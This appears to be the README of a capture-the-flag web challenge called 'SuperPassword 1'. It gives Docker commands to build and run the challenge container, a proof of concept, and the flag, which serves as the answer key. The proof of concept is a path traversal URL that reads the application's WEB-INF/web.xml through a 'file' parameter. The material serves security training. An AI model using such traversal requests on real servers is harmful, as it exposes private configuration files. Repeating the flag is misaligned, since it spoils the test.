# SuperPassword 1

## RUN
```bash
docker build -t superpass1 .
docker tag superpass1 ccr.ccs.tencentyun.com/360ctf/superpass1
docker run -d --restart=always -p 8082:8080 --read-only --tmpfs /usr/local/tomcat/logs --tmpfs /usr/local/tomcat/temp --tmpfs /usr/local/tomcat/work --name superpass1 superpass1
```

## PoC

```url
http://localhost:8082/bundle?file=../WEB-INF/web.xml
```

flag{a1c3d48220e9a1a20f1155419aff5f1b}